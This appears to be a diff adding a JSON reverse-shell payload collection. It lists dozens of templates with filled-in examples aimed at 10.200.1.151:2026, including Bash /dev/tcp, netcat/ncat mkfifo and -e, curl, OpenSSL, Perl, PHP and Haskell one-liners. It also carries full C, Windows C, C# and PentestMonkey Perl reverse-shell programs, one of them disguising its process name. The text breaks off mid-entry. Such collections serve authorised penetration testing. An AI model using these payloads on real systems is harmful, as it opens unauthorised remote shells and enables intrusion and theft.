@@ -1,0 +1,529 @@
+{
+    "title": "Reverse Shell Payload Structures",
+    "tags": ["reverse shell", "payload", "hacking", "examples"],
+    "category": "Security Documentation",
+    "default_template_IP": "10.10.10.10",
+    "default_template_listening_port": "9001",
+    "user_IP": "10.200.1.151",
+    "user_listening_port": "2026",
+    "sections": [
+      {
+        "OS": "Bash -i",
+        "payload_info": {
+          "payload_template": "sh -i >& /dev/tcp/10.10.10.10/9001 0>&1",
+          "example": "sh -i >& /dev/tcp/10.200.1.151/2026 0>&1"
+        }
+      },
+      {
+        "OS": "Bash 196",
+        "payload_info": {
+          "payload_template": "0<&196;exec 196<>/dev/tcp/10.10.10.10/9001; sh <&196 >&196 2>&196",
+          "example": "0<&196;exec 196<>/dev/tcp/10.200.1.151/2026; sh <&196 >&196 2>&196"
+        }
+      },
+      {
+        "OS": "Bash read line",
+        "payload_info": {
+          "payload_template": "exec 5<>/dev/tcp/10.10.10.10/9001;cat <&5 | while read line; do $line 2>&5 >&5; done",
+          "example": "exec 5<>/dev/tcp/10.200.1.151/2026;cat <&5 | while read line; do $line 2>&5 >&5; done"
+        }
+      },
+      {
+        "OS": "Bash 5",
+        "payload_info": {
+          "payload_template": "sh -i 5<> /dev/tcp/10.10.10.10/9001 0<&5 1>&5 2>&5",
+          "example": "sh -i 5<> /dev/tcp/10.200.1.151/2026 0<&5 1>&5 2>&5"
+        }
+      },
+      {
+        "OS": "Bash udp",
+        "payload_info": {
+          "payload_template": "sh -i >& /dev/udp/10.10.10.10/9001 0>&1",
+          "example": "sh -i >& /dev/udp/10.200.1.151/2026 0>&1"
+        }
+      },
+      {
+        "OS": "nc mkfifo",
+        "payload_info": {
+          "payload_template": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f",
+          "example": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.200.1.151 2026 >/tmp/f"
+        }
+      },
+      {
+        "OS": "nc -e",
+        "payload_info": {
+          "payload_template": "nc 10.10.10.10 9001 -e sh",
+          "example": "nc 10.200.1.151 2026 -e sh"
+        }
+      },
+      {
+        "OS": "nc.exe -e",
+        "payload_info": {
+          "payload_template": "nc.exe 10.10.10.10 9001 -e sh",
+          "example": "nc.exe 10.200.1.151 2026 -e sh"
+        }
+      },
+      {
+        "OS": "BusyBox -e",
+        "payload_info": {
+          "payload_template": "busybox nc 10.10.10.10 9001 -e sh",
+          "example": "busybox nc 10.200.1.151 2026 -e sh"
+        }
+      },
+      {
+        "OS": "nc -c",
+        "payload_info": {
+          "payload_template": "nc -c sh 10.10.10.10 9001",
+          "example": "nc -c sh 10.200.1.151 2026"
+        }
+      },
+      {
+        "OS": "ncat -e",
+        "payload_info": {
+          "payload_template": "ncat 10.10.10.10 9001 -e sh",
+          "example": "ncat 10.200.1.151 2026 -e sh"
+        }
+      },
+      {
+        "OS": "ncat.exe -e",
+        "payload_info": {
+          "payload_template": "ncat.exe 10.10.10.10 9001 -e sh",
+          "example": "ncat.exe 10.200.1.151 2026 -e sh"
+        }
+      },
+      {
+        "OS": "ncat udp",
+        "payload_info": {
+          "payload_template": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u 10.10.10.10 9001 >/tmp/f",
+          "example": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u 10.200.1.151 2026 >/tmp/f"
+        }
+      },
+      {
+        "OS": "curl",
+        "payload_info": {
+          "payload_template": "C='curl -Ns telnet://10.10.10.10:9001'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null",
+          "example": "C='curl -Ns telnet://10.200.1.151:2026'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null"
+        }
+      },
+      {
+        "OS": "rustcat",
+        "payload_info": {
+          "payload_template": "rcat connect -s sh 10.10.10.10 9001",
+          "example": "rcat connect -s sh 10.200.1.151 2026"
+        }
+      },
+      {
+        "OS": "C",
+        "payload_info": {
+          "payload_template": "#include <stdio.h>\\n#include <sys/socket.h>\\n#include <sys/types.h>\\n#include <stdlib.h>\\n#include <unistd.h>\\n#include <netinet/in.h>\\n#include <arpa/inet.h>\\n\\nint main(void){\\n    int port = 9001;\\n    struct sockaddr_in revsockaddr = {0};\\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\\n    revsockaddr.sin_family = AF_INET;       \\n    revsockaddr.sin_port = htons(port);\\n    revsockaddr.sin_addr.s_addr = inet_addr(\\\"10.10.10.10\\\");\\n    connect(sockt, (struct sockaddr *) &revsockaddr, \\n    sizeof(revsockaddr));\\n    dup2(sockt, 0);\\n    dup2(sockt, 1);\\n    dup2(sockt, 2);\\n    char * const argv[] = {\\\"/bin/sh\\\", NULL};\\n    execve(\\\"/bin/sh\\\", argv, NULL);\\n    return 0;  }",
+          "example": "#include <stdio.h>\\n#include <sys/socket.h>\\n#include <sys/types.h>\\n#include <stdlib.h>\\n#include <unistd.h>\\n#include <netinet/in.h>\\n#include <arpa/inet.h>\\n\\nint main(void){\\n    int port = 2026;\\n    struct sockaddr_in revsockaddr = {0};\\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\\n    revsockaddr.sin_family = AF_INET;       \\n    revsockaddr.sin_port = htons(port);\\n    revsockaddr.sin_addr.s_addr = inet_addr(\\\"10.200.1.151\\\");\\n    connect(sockt, (struct sockaddr *) &revsockaddr, \\n    sizeof(revsockaddr));\\n    dup2(sockt, 0);\\n    dup2(sockt, 1);\\n    dup2(sockt, 2);\\n    char * const argv[] = {\\\"/bin/sh\\\", NULL};\\n    execve(\\\"/bin/sh\\\", argv, NULL);\\n    return 0;  }"
+        }
+      },
+      {
+        "OS": "C Windows",
+        "payload_info": {
+          "payload_template": "#include <winsock2.h>\\n#include <stdio.h>\\n#pragma comment(lib,\\\"ws2_32\\\")\\n\\nWSADATA wsaData;\\nSOCKET Winsock;\\nstruct sockaddr_in hax; \\nchar ip_addr[16] = \\\"10.10.10.10\\\"; \\nchar port[6] = \\\"9001\\\";            \\n\\nSTARTUPINFO ini_processo;\\n\\nPROCESS_INFORMATION processo_info;\\n\\nint main()\\n{\\n    WSAStartup(MAKEWORD(2, 2), &wsaData);\\n    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\\n\\n\\n    struct hostent *host; \\n    host = gethostbyname(ip_addr);\\n    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));\\n\\n    hax.sin_family = AF_INET;\\n    hax.sin_port = htons(atoi(port));\\n    hax.sin_addr.s_addr = inet_addr(ip_addr);\\n\\n    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);\\n\\n    memset(&ini_processo, 0, sizeof(ini_processo));\\n    ini_processo.cb = sizeof(ini_processo);\\n    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; \\n    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;\\n\\n    TCHAR cmd[255] = TEXT(\\\"cmd.exe\\\");\\n\\n    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);\\n\\n    return 0;\\n}",
+          "example": "#include <winsock2.h>\\n#include <stdio.h>\\n#pragma comment(lib,\\\"ws2_32\\\")\\n\\nWSADATA wsaData;\\nSOCKET Winsock;\\nstruct sockaddr_in hax; \\nchar ip_addr[16] = \\\"10.200.1.151\\\"; \\nchar port[6] = \\\"2026\\\";            \\n\\nSTARTUPINFO ini_processo;\\n\\nPROCESS_INFORMATION processo_info;\\n\\nint main()\\n{\\n    WSAStartup(MAKEWORD(2, 2), &wsaData);\\n    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\\n\\n\\n    struct hostent *host; \\n    host = gethostbyname(ip_addr);\\n    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));\\n\\n    hax.sin_family = AF_INET;\\n    hax.sin_port = htons(atoi(port));\\n    hax.sin_addr.s_addr = inet_addr(ip_addr);\\n\\n    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);\\n\\n    memset(&ini_processo, 0, sizeof(ini_processo));\\n    ini_processo.cb = sizeof(ini_processo);\\n    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; \\n    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;\\n\\n    TCHAR cmd[255] = TEXT(\\\"cmd.exe\\\");\\n\\n    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);\\n\\n    return 0;\\n}"
+        }
+      },
+      {
+        "OS": "C# TCP Client",
+        "payload_info": {
+          "payload_template": "using System;\\nusing System.Text;\\nusing System.IO;\\nusing System.Diagnostics;\\nusing System.ComponentModel;\\nusing System.Linq;\\nusing System.Net;\\nusing System.Net.Sockets;\\n\\n\\nnamespace ConnectBack\\n{\\n\\tpublic class Program\\n\\t{\\n\\t\\tstatic StreamWriter streamWriter;\\n\\n\\t\\tpublic static void Main(string[] args)\\n\\t\\t{\\n\\t\\t\\tusing(TcpClient client = new TcpClient(\\\"10.10.10.10\\\", 9001))\\n\\t\\t\\t{\\n\\t\\t\\t\\tusing(Stream stream = client.GetStream())\\n\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\tusing(StreamReader rdr = new StreamReader(stream))\\n\\t\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\t\\tstreamWriter = new StreamWriter(stream);\\n\\t\\t\\t\\t\\t\\t\\n\\t\\t\\t\\t\\t\\tStringBuilder strInput = new StringBuilder();\\n\\n\\t\\t\\t\\t\\t\\tProcess p = new Process();\\n\\t\\t\\t\\t\\t\\tp.StartInfo.FileName = \\\"sh\\\";\\n\\t\\t\\t\\t\\t\\tp.StartInfo.CreateNoWindow = true;\\n\\t\\t\\t\\t\\t\\tp.StartInfo.UseShellExecute = false;\\n\\t\\t\\t\\t\\t\\tp.StartInfo.RedirectStandardOutput = true;\\n\\t\\t\\t\\t\\t\\tp.StartInfo.RedirectStandardInput = true;\\n\\t\\t\\t\\t\\t\\tp.StartInfo.RedirectStandardError = true;\\n\\t\\t\\t\\t\\t\\tp.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\\n\\t\\t\\t\\t\\t\\tp.Start();\\n\\t\\t\\t\\t\\t\\tp.BeginOutputReadLine();\\n\\n\\t\\t\\t\\t\\t\\twhile(true)\\n\\t\\t\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\t\\t\\tstrInput.Append(rdr.ReadLine());\\n\\t\\t\\t\\t\\t\\t\\t//strInput.Append(\\\"\\\\n\\\");\\n\\t\\t\\t\\t\\t\\t\\tp.StandardInput.WriteLine(strInput);\\n\\t\\t\\t\\t\\t\\t\\tstrInput.Remove(0, strInput.Length);\\n\\t\\t\\t\\t\\t\\t}\\n\\t\\t\\t\\t\\t}\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\t\\t}\\n\\n\\t\\tprivate static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\\n        {\\n            StringBuilder strOutput = new StringBuilder();\\n\\n            if (!String.IsNullOrEmpty(outLine.Data))\\n            {\\n                try\\n                {\\n                    strOutput.Append(outLine.Data);\\n                    streamWriter.WriteLine(strOutput);\\n                    streamWriter.Flush();\\n                }\\n                catch (Exception err) { }\\n            }\\n        }\\n\\n\\t}\\n}",
+          "example": "using System;\\nusing System.Text;\\nusing System.IO;\\nusing System.Diagnostics;\\nusing System.ComponentModel;\\nusing System.Linq;\\nusing System.Net;\\nusing System.Net.Sockets;\\n\\n\\nnamespace ConnectBack\\n{\\n\\tpublic class Program\\n\\t{\\n\\t\\tstatic StreamWriter streamWriter;\\n\\n\\t\\tpublic static void Main(string[] args)\\n\\t\\t{\\n\\t\\t\\tusing(TcpClient client = new TcpClient(\\\"10.200.1.151\\\", 2026))\\n\\t\\t\\t{\\n\\t\\t\\t\\tusing(Stream stream = client.GetStream())\\n\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\tusing(StreamReader rdr = new StreamReader(stream))\\n\\t\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\t\\tstreamWriter = new StreamWriter(stream);\\n\\t\\t\\t\\t\\t\\t\\n\\t\\t\\t\\t\\t\\tStringBuilder strInput = new StringBuilder();\\n\\n\\t\\t\\t\\t\\t\\tProcess p = new Process();\\n\\t\\t\\t\\t\\t\\tp.StartInfo.FileName = \\\"sh\\\";\\n\\t\\t\\t\\t\\t\\tp.StartInfo.CreateNoWindow = true;\\n\\t\\t\\t\\t\\t\\tp.StartInfo.UseShellExecute = false;\\n\\t\\t\\t\\t\\t\\tp.StartInfo.RedirectStandardOutput = true;\\n\\t\\t\\t\\t\\t\\tp.StartInfo.RedirectStandardInput = true;\\n\\t\\t\\t\\t\\t\\tp.StartInfo.RedirectStandardError = true;\\n\\t\\t\\t\\t\\t\\tp.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\\n\\t\\t\\t\\t\\t\\tp.Start();\\n\\t\\t\\t\\t\\t\\tp.BeginOutputReadLine();\\n\\n\\t\\t\\t\\t\\t\\twhile(true)\\n\\t\\t\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\t\\t\\tstrInput.Append(rdr.ReadLine());\\n\\t\\t\\t\\t\\t\\t\\t//strInput.Append(\\\"\\\\n\\\");\\n\\t\\t\\t\\t\\t\\t\\tp.StandardInput.WriteLine(strInput);\\n\\t\\t\\t\\t\\t\\t\\tstrInput.Remove(0, strInput.Length);\\n\\t\\t\\t\\t\\t\\t}\\n\\t\\t\\t\\t\\t}\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\t\\t}\\n\\n\\t\\tprivate static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\\n        {\\n            StringBuilder strOutput = new StringBuilder();\\n\\n            if (!String.IsNullOrEmpty(outLine.Data))\\n            {\\n                try\\n                {\\n                    strOutput.Append(outLine.Data);\\n                    streamWriter.WriteLine(strOutput);\\n                    streamWriter.Flush();\\n                }\\n                catch (Exception err) { }\\n            }\\n        }\\n\\n\\t}\\n}"
+        }
+      },
+      {
+        "OS": "C# Bash -i",
+        "payload_info": {
+          "payload_template": "using System;\\nusing System.Diagnostics;\\n\\nnamespace BackConnect {\\n  class ReverseBash {\\n\\tpublic static void Main(string[] args) {\\n\\t  Process proc = new System.Diagnostics.Process();\\n\\t  proc.StartInfo.FileName = \\\"sh\\\";\\n\\t  proc.StartInfo.Arguments = \\\"-c \\\\\\\"sh -i >& /dev/tcp/10.10.10.10/9001 0>&1\\\\\\\"\\\";\\n\\t  proc.StartInfo.UseShellExecute = false;\\n\\t  proc.StartInfo.RedirectStandardOutput = true;\\n\\t  proc.Start();\\n\\n\\t  while (!proc.StandardOutput.EndOfStream) {\\n\\t\\tConsole.WriteLine(proc.StandardOutput.ReadLine());\\n\\t  }\\n\\t}\\n  }\\n}",
+          "example": "using System;\\nusing System.Diagnostics;\\n\\nnamespace BackConnect {\\n  class ReverseBash {\\n\\tpublic static void Main(string[] args) {\\n\\t  Process proc = new System.Diagnostics.Process();\\n\\t  proc.StartInfo.FileName = \\\"sh\\\";\\n\\t  proc.StartInfo.Arguments = \\\"-c \\\\\\\"sh -i >& /dev/tcp/10.200.1.151/2026 0>&1\\\\\\\"\\\";\\n\\t  proc.StartInfo.UseShellExecute = false;\\n\\t  proc.StartInfo.RedirectStandardOutput = true;\\n\\t  proc.Start();\\n\\n\\t  while (!proc.StandardOutput.EndOfStream) {\\n\\t\\tConsole.WriteLine(proc.StandardOutput.ReadLine());\\n\\t  }\\n\\t}\\n  }\\n}"
+        }
+      },
+      {
+        "OS": "Haskell #1",
+        "payload_info": {
+          "payload_template": "module Main where\\n\\nimport System.Process\\n\\nmain = callCommand \\\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc 10.10.10.10 9001 >/tmp/f\\\"",
+          "example": "module Main where\\n\\nimport System.Process\\n\\nmain = callCommand \\\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc 10.200.1.151 2026 >/tmp/f\\\""
+        }
+      },
+      {
+        "OS": "Haskell",
+        "payload_info": {
+          "payload_template": "runhaskell -e 'import Network.Socket;import System.IO;import System.Process;main=do s<-socket AF_INET Stream defaultProtocol;connect s (SockAddrInet 9001 (tupleToHostAddress (10,10,10,10)));h<-socketToHandle s ReadWriteMode;p<-createProcess (proc \\\"/bin/sh\\\" []){std_in=UseHandle h,std_out=UseHandle h,std_err=UseHandle h};waitForProcess p;hClose h'",
+          "example": "runhaskell -e 'import Network.Socket;import System.IO;import System.Process;main=do s<-socket AF_INET Stream defaultProtocol;connect s (SockAddrInet 2026 (tupleToHostAddress (10,200,1,151)));h<-socketToHandle s ReadWriteMode;p<-createProcess (proc \\\"/bin/sh\\\" []){std_in=UseHandle h,std_out=UseHandle h,std_err=UseHandle h};waitForProcess p;hClose h'"
+        }
+      },
+      {
+        "OS": "OpenSSL",
+        "payload_info": {
+          "payload_template": "mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.10.10:9001 > /tmp/s; rm /tmp/s",
+          "example": "mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.200.1.151:2026 > /tmp/s; rm /tmp/s"
+        }
+      },
+      {
+        "OS": "Perl",
+        "payload_info": {
+          "payload_template": "perl -e 'use Socket;$i=\\\"10.10.10.10\\\";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\") );if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\\\" >&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"sh -i\\\");};'",
+          "example": "perl -e 'use Socket;$i=\\\"10.200.1.151\\\";$p=2026;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\") );if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\\\" >&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"sh -i\\\");};'"
+        }
+      },
+      {
+        "OS": "Perl no sh",
+        "payload_info": {
+          "payload_template": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\\\"10.10.10.10:9001\\\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
+          "example": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\\\"10.200.1.151:2026\\\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
+        }
+      },
+      {
+        "OS": "Perl PentestMonkey",
+        "payload_info": {
+          "payload_template": "#!/usr/bin/perl -w\\n# perl-reverse-shell - A Reverse Shell implementation in PERL\\n# Copyright (C) 2006 pentestmonkey@pentestmonkey.net\\n#\\n# This tool may be used for legal purposes only.  Users take full responsibility\\n# for any actions performed using this tool.  The author accepts no liability\\n# for damage caused by this tool.  If these terms are not acceptable to you, then\\n# do not use this tool.\\n#\\n# In all other respects the GPL version 2 applies:\\n#\\n# This program is free software; you can redistribute it and/or modify\\n# it under the terms of the GNU General Public License version 2 as\\n# published by the Free Software Foundation.\\n#\\n# This program is distributed in the hope that it will be useful,\\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\\n# GNU General Public License for more details.\\n#\\n# You should have received a copy of the GNU General Public License along\\n# with this program; if not, write to the Free Software Foundation, Inc.,\\n# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\\n#\\n# This tool may be used for legal purposes only.  Users take full responsibility\\n# for any actions performed using this tool.  If these terms are not acceptable to\\n# you, then do not use this tool.\\n#\\n# You are encouraged to send comments, improvements or suggestions to\\n# me at pentestmonkey@pentestmonkey.net\\n#\\n# Description\\n# -----------\\n# This script will make an outbound TCP connection to a hardcoded IP and port.\\n# The recipient will be given a shell running as the current user (apache normally).\\n#\\nuse strict;\\nuse Socket;\\nuse FileHandle;\\nuse POSIX;\\nmy $VERSION = \\\"1.0\\\";\\n\\n# Where to send the reverse shell.  Change these.\\nmy $ip = '10.10.10.10';\\nmy $port = 9001;\\n\\n# Options\\nmy $daemon = 1;\\nmy $auth   = 0; # 0 means authentication is disabled and any \\n\\t\\t# source IP can access the reverse shell\\nmy $authorised_client_pattern = qr(^127\\.0\\.0\\.1$);\\n\\n# Declarations\\nmy $global_page = \\\"\\\";\\nmy $fake_process_name = \\\"/usr/sbin/apache\\\";\\n\\n# Change the process name to be less conspicious\\n$0 = \\\"[httpd]\\\";\\n\\n# Authenticate based on source IP address if required\\nif (defined($ENV{'REMOTE_ADDR'})) {\\n\\tcgiprint(\\\"Browser IP address appears to be: $ENV{'REMOTE_ADDR'}\\\");\\n\\n\\tif ($auth) {\\n\\t\\tunless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {\\n\\t\\t\\tcgiprint(\\\"ERROR: Your client isn't authorised to view this page\\\");\\n\\t\\t\\tcgiexit();\\n\\t\\t}\\n\\t}\\n} elsif ($auth) {\\n\\tcgiprint(\\\"ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access\\\");\\n\\tcgiexit(0);\\n}\\n\\n# Background and dissociate from parent process if required\\nif ($daemon) {\\n\\tmy $pid = fork();\\n\\tif ($pid) {\\n\\t\\tcgiexit(0); # parent exits\\n\\t}\\n\\n\\tsetsid();\\n\\tchdir('/');\\n\\tumask(0);\\n}\\n\\n# Make TCP connection for reverse shell\\nsocket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));\\nif (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {\\n\\tcgiprint(\\\"Sent reverse shell to $ip:$port\\\");\\n\\tcgiprintpage();\\n} else {\\n\\tcgiprint(\\\"Couldn't open reverse shell to $ip:$port: $!\\\");\\n\\tcgiexit();\\n}\\n\\n# Redirect STDIN, STDOUT, STDERR to the socket\\nopen(STDIN, \\\">&SOCK\\\");\\nopen(STDOUT,\\\">&SOCK\\\");\\nopen(STDERR,\\\">&SOCK\\\");\\n\\n# Actually execve the shell\\nexec(\\\"/bin/sh -i\\\") || die \\\"exec failed\\\";\\n\\nsub cgiprint {\\n\\tmy $line = shift;\\n\\t$line .= \\\"<p>\\\";\\n\\t$global_page .= $line;\\n}\\n\\nsub cgiexit {\\n\\tcgiprintpage();\\n\\texit 0; # 0 to avoid endlush problems\\n}\\n\\nsub cgiprintpage {\\n\\tprint \\\"Content-Type: text/html\\n\\n$global_page\\\";\\n}",
+          "example": "#!/usr/bin/perl -w\\n# perl-reverse-shell - A Reverse Shell implementation in PERL\\n# Copyright (C) 2006 pentestmonkey@pentestmonkey.net\\n#\\n# This tool may be used for legal purposes only.  Users take full responsibility\\n# for any actions performed using this tool.  The author accepts no liability\\n# for damage caused by this tool.  If these terms are not acceptable to you, then\\n# do not use this tool.\\n#\\n# In all other respects the GPL version 2 applies:\\n#\\n# This program is free software; you can redistribute it and/or modify\\n# it under the terms of the GNU General Public License version 2 as\\n# published by the Free Software Foundation.\\n#\\n# This program is distributed in the hope that it will be useful,\\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\\n# GNU General Public License for more details.\\n#\\n# You should have received a copy of the GNU General Public License along\\n# with this program; if not, write to the Free Software Foundation, Inc.,\\n# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\\n#\\n# This tool may be used for legal purposes only.  Users take full responsibility\\n# for any actions performed using this tool.  If these terms are not acceptable to\\n# you, then do not use this tool.\\n#\\n# You are encouraged to send comments, improvements or suggestions to\\n# me at pentestmonkey@pentestmonkey.net\\n#\\n# Description\\n# -----------\\n# This script will make an outbound TCP connection to a hardcoded IP and port.\\n# The recipient will be given a shell running as the current user (apache normally).\\n#\\nuse strict;\\nuse Socket;\\nuse FileHandle;\\nuse POSIX;\\nmy $VERSION = \\\"1.0\\\";\\n\\n# Where to send the reverse shell.  Change these.\\nmy $ip = '10.200.1.151';\\nmy $port = 2026;\\n\\n# Options\\nmy $daemon = 1;\\nmy $auth   = 0; # 0 means authentication is disabled and any \\n\\t\\t# source IP can access the reverse shell\\nmy $authorised_client_pattern = qr(^127\\.0\\.0\\.1$);\\n\\n# Declarations\\nmy $global_page = \\\"\\\";\\nmy $fake_process_name = \\\"/usr/sbin/apache\\\";\\n\\n# Change the process name to be less conspicious\\n$0 = \\\"[httpd]\\\";\\n\\n# Authenticate based on source IP address if required\\nif (defined($ENV{'REMOTE_ADDR'})) {\\n\\tcgiprint(\\\"Browser IP address appears to be: $ENV{'REMOTE_ADDR'}\\\");\\n\\n\\tif ($auth) {\\n\\t\\tunless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {\\n\\t\\t\\tcgiprint(\\\"ERROR: Your client isn't authorised to view this page\\\");\\n\\t\\t\\tcgiexit();\\n\\t\\t}\\n\\t}\\n} elsif ($auth) {\\n\\tcgiprint(\\\"ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access\\\");\\n\\tcgiexit(0);\\n}\\n\\n# Background and dissociate from parent process if required\\nif ($daemon) {\\n\\tmy $pid = fork();\\n\\tif ($pid) {\\n\\t\\tcgiexit(0); # parent exits\\n\\t}\\n\\n\\tsetsid();\\n\\tchdir('/');\\n\\tumask(0);\\n}\\n\\n# Make TCP connection for reverse shell\\nsocket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));\\nif (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {\\n\\tcgiprint(\\\"Sent reverse shell to $ip:$port\\\");\\n\\tcgiprintpage();\\n} else {\\n\\tcgiprint(\\\"Couldn't open reverse shell to $ip:$port: $!\\\");\\n\\tcgiexit();\\n}\\n\\n# Redirect STDIN, STDOUT, STDERR to the socket\\nopen(STDIN, \\\">&SOCK\\\");\\nopen(STDOUT,\\\">&SOCK\\\");\\nopen(STDERR,\\\">&SOCK\\\");\\n\\n# Actually execve the shell\\nexec(\\\"/bin/sh -i\\\") || die \\\"exec failed\\\";\\n\\nsub cgiprint {\\n\\tmy $line = shift;\\n\\t$line .= \\\"<p>\\\";\\n\\t$global_page .= $line;\\n}\\n\\nsub cgiexit {\\n\\tcgiprintpage();\\n\\texit 0; # 0 to avoid endlush problems\\n}\\n\\nsub cgiprintpage {\\n\\tprint \\\"Content-Type: text/html\\n\\n$global_page\\\";\\n}"
+        }
+      },
+      {
+        "OS": "PHP PentestMonkey",
+        "payload_info": {
+          "payload_template": "php -r '$sock=fsockopen(\\\"10.10.10.10\\\",9001);exec(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'",
+          "example": "php -r '$sock=fsockopen(\\\"10.200.1.151\\\",2026);exec(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'"
+        }
+      },
+      {
+        "OS": "PHP Ivan Sincek",
+        "payload_info": {
+          "payload_template": "php -r '$sock=fsockopen(\\\"10.10.10.10\\\",9001);$proc=proc_open(\\\"/bin/sh -i\\\", array(0=>$sock,1=>$sock,2=>$sock),$pipes);'",
+          "example": "php -r '$sock=fsockopen(\\\"10.200.1.151\\\",2026);$proc=proc_open(\\\"/bin/sh -i\\\", array(0=>$sock,1=>$sock,2=>$sock),$pipes);'"
+        }
+      },
+      {
+        "OS": "PHP cmd",
+        "payload_info": {
+          "payload_template": "php -r '$sock=fsockopen(\\\"10.10.10.10\\\",9001);system(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'",
+          "example": "php -r '$sock=fsockopen(\\\"10.200.1.151\\\",2026);system(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'"
+        }
+      },
+      {
+        "OS": "PHP cmd 2",
+        "payload_info": {
+          "payload_template": "php -r '$sock=fsockopen(\\\"10.10.10.10\\\",9001);shell_exec(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'",
+          "example": "php -r '$sock=fsockopen(\\\"10.200.1.151\\\",2026);shell_exec(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'"
+        }
+      },
+      {
+        "OS": "PHP cmd small",
+        "payload_info": {
+          "payload_template": "php -r '$sock=fsockopen(\\\"10.10.10.10\\\",9001);`/bin/sh -i <&3 >&3 2>&3`;'",
+          "example": "php -r '$sock=fsockopen(\\\"10.200.1.151\\\",2026);`/bin/sh -i <&3 >&3 2>&3`;'"
+        }
+      },
+      {
+        "OS": "PHP exec",
+        "payload_info": {
+          "payload_template": "php -r '$sock=fsockopen(\\\"10.10.10.10\\\",9001);exec(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'",
+          "example": "php -r '$sock=fsockopen(\\\"10.200.1.151\\\",2026);exec(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'"
+        }
+      },
+      {
+        "OS": "PHP shell_exec",
+        "payload_info": {
+          "payload_template": "php -r '$sock=fsockopen(\\\"10.10.10.10\\\",9001);shell_exec(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'",
+          "example": "php -r '$sock=fsockopen(\\\"10.200.1.151\\\",2026);shell_exec(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'"
+        }
+      },
+      {
+        "OS": "PHP system",
+        "payload_info": {
+          "payload_template": "php -r '$sock=fsockopen(\\\"10.10.10.10\\\",9001);system(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'",
